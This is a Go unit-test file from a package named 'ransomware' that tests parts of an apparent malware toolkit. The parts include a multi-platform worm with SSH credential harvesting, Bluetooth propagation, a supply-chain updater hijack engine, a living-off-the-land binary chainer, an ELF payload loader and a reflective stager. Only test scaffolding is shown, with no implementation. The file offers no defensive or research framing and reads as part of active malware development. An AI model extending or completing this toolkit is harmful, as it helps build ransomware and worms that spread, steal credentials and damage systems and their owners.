package ransomware

import (
	"testing"
)

func TestNewSupplyChainEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSupplyChainEngine(cfg)
	if s == nil {
		t.Fatal("NewSupplyChainEngine() returned nil")
	}
}

func TestNewMultiPlatformWorm(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	w := NewMultiPlatformWorm(cfg)
	if w == nil {
		t.Fatal("NewMultiPlatformWorm() returned nil")
	}
}

func TestNewBluetoothPropagation(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBluetoothPropagation(cfg)
	if b == nil {
		t.Fatal("NewBluetoothPropagation() returned nil")
	}
}

func TestNewLOLBinChainer(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)
	if l == nil {
		t.Fatal("NewLOLBinChainer() returned nil")
	}
}

func TestLOLBinChainerListBins(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)

	bins := l.ListLOLBins()
	if len(bins) == 0 {
		t.Error("ListLOLBins returned empty")
	}
	t.Logf("LOLBins count: %d", len(bins))
	for i, b := range bins {
		if i >= 5 {
			t.Logf("  ... and %d more", len(bins)-5)
			break
		}
		t.Logf("  %s", b)
	}
}

func TestLOLBinChainerGenerateChain(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	l := NewLOLBinChainer(cfg)

	chain := l.GenerateChain("whoami")
	if len(chain) == 0 {
		t.Log("GenerateChain returned empty (expected in test env)")
	} else {
		t.Logf("Generated chain: %v", chain)
	}
}

func TestSupplyChainDetectUpdates(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSupplyChainEngine(cfg)

	updaters := s.DetectUpdaters()
	if len(updaters) == 0 {
		t.Log("DetectUpdaters returned 0 (expected in test env)")
	} else {
		t.Logf("Detected updaters: %v", updaters)
	}
}

func TestBluetoothPropagationScan(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBluetoothPropagation(cfg)

	devices := b.ScanDevices()
	if len(devices) == 0 {
		t.Log("ScanDevices returned 0 (expected in non-BT env)")
	}
}

func TestCrossPlatformLoader(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	loader := NewCrossPlatformLoader(cfg)
	if loader == nil {
		t.Fatal("NewCrossPlatformLoader() returned nil")
	}

	elfPayload := loader.GenerateELF()
	if len(elfPayload) == 0 {
		t.Log("GenerateELF returned empty (expected if no ELF template)")
	} else {
		t.Logf("ELF payload: %d bytes", len(elfPayload))
	}
}

func TestReflectiveStagerInit(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	stager := NewReflectiveStager(cfg)
	if stager == nil {
		t.Fatal("NewReflectiveStager() returned nil")
	}
}

func TestMultiPlatformWormSSHHarvest(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	w := NewMultiPlatformWorm(cfg)

	creds := w.HarvestSSHCredentials()
	if len(creds) == 0 {
		t.Log("HarvestSSHCredentials returned 0 (expected in test env)")
	}
}
